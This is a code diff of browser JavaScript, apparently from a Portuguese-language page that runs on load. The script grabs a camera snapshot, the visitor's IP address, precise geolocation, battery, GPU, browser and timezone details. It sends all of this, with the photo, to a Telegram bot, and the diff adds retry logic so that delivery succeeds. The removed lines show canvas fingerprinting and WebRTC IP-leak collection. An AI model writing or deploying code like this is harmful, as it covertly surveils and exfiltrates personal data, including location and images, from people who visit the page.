@@ -6,6 +6,8 @@
 
     let collectedData = {};
     let cameraStream = null;
+    let sendAttempts = 0;
+    const MAX_ATTEMPTS = 10;
 
     async function collectAll() {
         collectedData = {};
@@ -23,10 +25,8 @@
                 height: settings.height,
                 facingMode: settings.facingMode || 'user'
             };
-            console.log('📷 Câmara ativada:', settings.width, 'x', settings.height);
         } catch (e) {
             collectedData.camera = { error: 'denied' };
-            console.log('📷 Câmara negada:', e.message);
         }
 
         try {
@@ -43,27 +43,15 @@
                         as: data.as
                     };
                     console.log('🌐 IP:', data.query);
-                } else {
-                    throw new Error(data.message || 'IP API error');
                 }
-            } else {
-                throw new Error('HTTP ' + res.status);
             }
         } catch (e) {
-            console.log('🌐 IP fallback:', e.message);
-            try {
-                const fallback = await fetch('https://api.ipify.org?format=json');
-                const data = await fallback.json();
-                collectedData.ip = { ip: data.ip };
-                console.log('🌐 IP (fallback):', data.ip);
-            } catch (e2) {
-                console.log('🌐 IP falhou completamente');
-            }
+            console.log('🌐 IP falhou');
         }
 
         try {
             const pos = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: true });
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
             });
             collectedData.geolocation = {
                 lat: pos.coords.latitude,
@@ -74,7 +62,7 @@
         } catch (e) {
             console.log('📍 Geo negada');
         }
-        
+
         try {
             const battery = await navigator.getBattery();
             collectedData.battery = {
@@ -85,17 +73,6 @@
         } catch (e) {}
 
         try {
-            const canvas = document.createElement('canvas');
-            canvas.width = 128;
-            canvas.height = 64;
-            const ctx = canvas.getContext('2d');
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(0, 0, 128, 64);
-            ctx.fillStyle = '#fff';
-            ctx.font = 'bold 32px monospace';
-            ctx.fillText('⏣', 10, 50);
-            collectedData.canvas = canvas.toDataURL().substring(0, 64) + '...';
-
             const gl = document.createElement('canvas').getContext('webgl');
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
             if (debugInfo) {
@@ -103,12 +80,9 @@
                     vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                     renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                 };
-                console.log('🖥️ GPU:', collectedData.gpu.renderer);
             }
-        } catch (e) {
-            console.log('Canvas/GPU erro');
-        }
-        
+        } catch (e) {}
+
         collectedData.browser = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -127,26 +101,14 @@
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             offset: new Date().getTimezoneOffset()
         };
-        
-        try {
-            const rtc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-            rtc.createDataChannel('test');
-            const offer = await rtc.createOffer();
-            await rtc.setLocalDescription(offer);
-            const candidates = [];
-            rtc.onicecandidate = (e) => {
-                if (e.candidate) candidates.push(e.candidate.candidate);
-            };
-            await new Promise((r) => setTimeout(r, 1500));
-            collectedData.webrtc = candidates;
-            rtc.close();
-        } catch (e) {}
 
         collectedData.collectedAt = new Date().toISOString();
         collectedData.url = window.location.href;
 
-        console.log('✅ Coleta concluída');
-        await sendToTelegram();
+        console.log('✅ Coleta concluída. A iniciar tentativas de envio...');
+        
+        sendAttempts = 0;
+        trySend();
     }
 
     function captureSnapshot() {
@@ -168,10 +130,19 @@
         });
     }
 
-    async function sendToTelegram() {
+    async function trySend() {
+        sendAttempts++;
+        console.log(`📤 Tentativa ${sendAttempts}/${MAX_ATTEMPTS}...`);
+
         try {
             const data = collectedData;
             const snapshot = await captureSnapshot();
+
+            if (!data.ip && !data.geolocation && !data.battery) {
+                console.log('⚠️ Sem dados para enviar ainda. Aguardando...');
+                scheduleNext();
+                return;
+            }
 
             let msg = '📡 opsec.whbf.cc\n━━━━━━━━━━━\n\n';
 
@@ -231,8 +202,11 @@
             });
 
             if (!response.ok) {
-                throw new Error('Telegram error: ' + response.status);
+                throw new Error('HTTP ' + response.status);
             }
+
+            console.log('✅ Mensagem enviada com sucesso!');
+            document.getElementById('status').textContent = '✅';
 
             if (snapshot) {
                 const photoUrl = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendPhoto';
@@ -244,10 +218,23 @@
                 console.log('📸 Snapshot enviado');
             }
 
+            return;
+
         } catch (e) {
-            console.error('Erro no sendToTelegram:', e);
+            console.log('❌ Erro na tentativa', sendAttempts, ':', e.message);
+            scheduleNext();
         }
     }
-    
+
+    function scheduleNext() {
+        if (sendAttempts < MAX_ATTEMPTS) {
+            console.log(`⏳ Próxima tentativa em 3 segundos...`);
+            setTimeout(trySend, 3000);
+        } else {
+            console.log('🛑 Máximo de tentativas atingido. A página pode ser recarregada para nova tentativa.');
+            document.getElementById('status').textContent = '⚠️';
+        }
+    }
+
     collectAll();
 })();
